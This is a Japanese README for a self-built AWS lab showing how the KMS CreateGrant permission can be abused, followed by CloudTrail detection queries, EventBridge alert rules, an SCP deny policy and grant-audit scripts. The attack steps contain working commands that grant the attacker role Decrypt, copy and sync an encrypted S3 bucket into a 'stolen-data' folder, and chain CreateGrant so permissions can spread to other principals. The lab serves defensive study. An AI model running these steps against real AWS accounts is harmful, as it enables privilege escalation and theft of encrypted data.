# KMSグラント悪用検証環境

## 攻撃シナリオ

1. **グラント作成権限の悪用**: 攻撃者が`CreateGrant`権限を使って自分自身に暗号化・復号化権限を付与
2. **S3オブジェクトの奪取**: グラントで取得した復号化権限を使ってKMS暗号化されたS3データを窃取
3. **権限の連鎖と拡散**: CreateGrant権限を使ってさらに他のプリンシパルに権限を拡散

## デプロイ（防御側アカウント）

```bash
cdk deploy --parameters AllowedAccountId=<攻撃者アカウントID>

# 出力値を記録（攻撃者に共有）
KEY_ID=$(aws cloudformation describe-stacks --stack-name PublicKmsStack \
  --query "Stacks[0].Outputs[?OutputKey=='KeyArn'].OutputValue" --output text)

BUCKET=$(aws cloudformation describe-stacks --stack-name PublicKmsStack \
  --query "Stacks[0].Outputs[?OutputKey=='BucketName'].OutputValue" --output text)

ROLE_ARN=$(aws cloudformation describe-stacks --stack-name PublicKmsStack \
  --query "Stacks[0].Outputs[?OutputKey=='AttackerRoleArn'].OutputValue" --output text)

echo "KEY_ID=$KEY_ID"
echo "BUCKET=$BUCKET"
echo "ROLE_ARN=$ROLE_ARN"
```

## CloudShellでの検証手順（攻撃者アカウント）

### ステップ1: リソース情報を設定（防御側から共有された値）

```bash
# 防御側から共有された値を設定
export ROLE_ARN="arn:aws:iam::123456789012:role/KmsGrantAttackerRole"
export KEY_ID="arn:aws:kms:ap-northeast-1:123456789012:key/12345678-1234-1234-1234-123456789012"
export BUCKET="publickmsstack-publickmsb-xxxxx"
```

### ステップ2: 攻撃者ロールにスイッチ

```bash
CREDS=$(aws sts assume-role --role-arn $ROLE_ARN --role-session-name attacker)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Credentials.SessionToken')
```

### ステップ3: 初期状態の確認（アクセス拒否を確認）

```bash
# 暗号化データへのアクセスを試行（失敗するはず）
aws s3 cp s3://$BUCKET/secret.txt - 2>&1

# 現在のグラント一覧
aws kms list-grants --key-id $KEY_ID
```

### ステップ4: グラント作成で権限昇格

```bash
# 自分自身にDecrypt権限を付与するグラントを作成
GRANT_ID=$(aws kms create-grant \
  --key-id $KEY_ID \
  --grantee-principal $ROLE_ARN \
  --operations Decrypt GenerateDataKey \
  --query GrantId --output text)

echo "✓ Grant created: $GRANT_ID"
echo "⚠️  攻撃者が復号化権限を取得しました"
```

### ステップ5: S3オブジェクトの奪取

```bash
# グラントによる復号化権限を使ってS3データを窃取
aws s3 cp s3://$BUCKET/secret.txt - 2>&1

# バケット内の全オブジェクトをダウンロード
aws s3 sync s3://$BUCKET ./stolen-data/

echo "✓ S3オブジェクトの奪取に成功"
```

### ステップ6: CreateGrant権限の連鎖（権限昇格）

```bash
# CreateGrant権限を使って、さらに他のプリンシパルにグラント作成権限を付与
echo "⚠️  CreateGrant権限を悪用して権限を拡散します"

# 自分自身にCreateGrant + Decrypt権限を持つグラントを作成（権限の永続化）
# 注: CreateGrant単独では作成できないため、他の操作と組み合わせる必要がある
CREATE_GRANT_ID=$(aws kms create-grant \
  --key-id $KEY_ID \
  --grantee-principal $ROLE_ARN \
  --operations Decrypt CreateGrant \
  --query GrantId --output text 2>&1)

if [[ $? -eq 0 ]]; then
  echo "✓ CreateGrant権限の連鎖に成功: $CREATE_GRANT_ID"
  echo "⚠️  攻撃者は無制限にグラントを作成できるようになりました"
  echo "⚠️  他のアカウントやユーザーに権限を拡散可能です"
  
  # 例: 別のプリンシパル（他のロールやアカウント）にも権限を付与可能
  # OTHER_PRINCIPAL="arn:aws:iam::999999999999:role/AnotherRole"
  # aws kms create-grant --key-id $KEY_ID --grantee-principal $OTHER_PRINCIPAL --operations Decrypt
else
  echo "✗ CreateGrant権限の連鎖は失敗（キーポリシーで制限されている可能性）"
fi

echo ""
echo "📝 グラントの制約:"
echo "   - CreateGrant単独では作成不可（他の操作と組み合わせが必須）"
echo "   - ScheduleKeyDeletion、DisableKeyはグラントでサポート外"
echo "   - これらの管理操作にはIAMポリシー/キーポリシーが必要"
```

### ステップ7: 攻撃の影響確認

```bash
# キーの状態を確認
aws kms describe-key --key-id $KEY_ID --query 'KeyMetadata.KeyState'

# 作成したグラント一覧
aws kms list-grants --key-id $KEY_ID --query 'Grants[].{GrantId:GrantId,Operations:Operations}'
```

### ステップ8: クリーンアップ（オプション）

```bash
# 作成したグラントを削除
aws kms revoke-grant --key-id $KEY_ID --grant-id $GRANT_ID
[[ -n "$CREATE_GRANT_ID" ]] && aws kms revoke-grant --key-id $KEY_ID --grant-id $CREATE_GRANT_ID

# 認証情報をリセット
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

echo "✓ クリーンアップ完了"
```

## 検出・監視方法

### なぜグラント悪用は検知しにくいのか

1. **正常な操作との区別が困難**: AWSサービスも内部的にグラントを使用するため、CreateGrantイベント自体は頻繁に発生
2. **グラント経由の操作は追跡困難**: Decryptイベントにはどのグラント経由かの情報が含まれない
3. **クロスアカウントで追跡が分断**: 異なるアカウント間のログを相関分析する必要がある
4. **グラントは即座に有効**: IAMポリシー変更と違い、承認プロセスなしで即座に権限が付与される

### CloudTrailで監視すべきイベント

```bash
# 1. CreateGrantイベントの監視（特にクロスアカウント）
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateGrant \
  --max-results 50 \
  --query 'Events[].{Time:EventTime,User:Username,Account:"$(echo {} | jq -r .CloudTrailEvent | jq -r .userIdentity.accountId)"}'

# 2. 異常なDecrypt操作の急増を検知
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=Decrypt \
  --start-time $(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%S) \
  --max-results 100

# 3. RetireGrant/RevokeGrantの監視（証拠隠滅の可能性）
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=RevokeGrant \
  --max-results 10
```

### 高度な検知クエリ（CloudWatch Logs Insights）

```sql
# CreateGrantで危険な権限を付与している操作を検出
fields @timestamp, userIdentity.principalId, requestParameters.keyId, requestParameters.operations
| filter eventName = "CreateGrant"
| filter requestParameters.operations like /CreateGrant/
| sort @timestamp desc

# クロスアカウントのCreateGrantを検出
fields @timestamp, userIdentity.accountId, requestParameters.granteePrincipal
| filter eventName = "CreateGrant"
| filter requestParameters.granteePrincipal not like userIdentity.accountId
| sort @timestamp desc

# 短時間に大量のグラントを作成している異常を検出
fields @timestamp, userIdentity.principalId
| filter eventName = "CreateGrant"
| stats count() by userIdentity.principalId, bin(5m)
| filter count > 10
```

### グラント監査（定期実行推奨）

```bash
# 1. 危険な権限を持つグラントを検出
aws kms list-grants --key-id $KEY_ID \
  --query "Grants[?contains(Operations, 'CreateGrant')].{GrantId:GrantId,Grantee:GranteePrincipal,Operations:Operations,Created:CreationDate}"

# 2. クロスアカウントのグラントを検出
CURRENT_ACCOUNT=$(aws sts get-caller-identity --query Account --output text)
aws kms list-grants --key-id $KEY_ID \
  --query "Grants[?!contains(GranteePrincipal, '$CURRENT_ACCOUNT')]"

# 3. 古いグラント（30日以上）を検出
aws kms list-grants --key-id $KEY_ID \
  --query "Grants[?CreationDate < '$(date -u -d '30 days ago' +%Y-%m-%d)']"

# 4. 制約のないグラントを検出（最も危険）
aws kms list-grants --key-id $KEY_ID \
  --query "Grants[?Constraints == null]"
```

## 防御策

### 1. CreateGrant権限を最小限に制限

```typescript
// 危険な権限を除外
actions: ['kms:Encrypt', 'kms:Decrypt', 'kms:GenerateDataKey']
// 除外: CreateGrant, ScheduleKeyDeletion, DisableKey
```

### 2. グラント制約を必須化

```bash
aws kms create-grant --key-id $KEY_ID \
  --grantee-principal $PRINCIPAL \
  --operations Decrypt \
  --constraints EncryptionContextSubset={Environment=Production}
```

### 3. CloudTrail + EventBridge監視（リアルタイム検知）

```bash
# CreateGrantでCreateGrant権限を含む場合にアラート
aws events put-rule --name DetectDangerousKmsGrant \
  --event-pattern '{
    "source": ["aws.kms"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {
      "eventName": ["CreateGrant"],
      "requestParameters": {
        "operations": ["CreateGrant"]
      }
    }
  }'

# SNSトピックに通知
aws events put-targets --rule DetectDangerousKmsGrant \
  --targets "Id"="1","Arn"="arn:aws:sns:ap-northeast-1:123456789012:SecurityAlerts"

# クロスアカウントのCreateGrantを検知
aws events put-rule --name DetectCrossAccountKmsGrant \
  --event-pattern '{
    "source": ["aws.kms"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {
      "eventName": ["CreateGrant"],
      "requestParameters": {
        "granteePrincipal": [{"anything-but": {"prefix": "arn:aws:iam::123456789012:"}}]
      }
    }
  }'
```

### 4. SCPでグラント操作を制限

```json
{
  "Effect": "Deny",
  "Action": [
    "kms:CreateGrant",
    "kms:ScheduleKeyDeletion",
    "kms:DisableKey"
  ],
  "Resource": "*",
  "Condition": {
    "StringNotEquals": {
      "aws:PrincipalOrgID": "o-xxxxxxxxxx"
    }
  }
}
```

### 5. 定期的なグラント監査と削除

```bash
aws kms list-grants --key-id $KEY_ID --query "Grants[].GrantId" --output text | \
  xargs -n1 -I {} aws kms revoke-grant --key-id $KEY_ID --grant-id {}
```

## 参考

- [AWS KMS Grants](https://docs.aws.amazon.com/kms/latest/developerguide/grants.html)
- [KMS Best Practices](https://docs.aws.amazon.com/kms/latest/developerguide/best-practices.html)
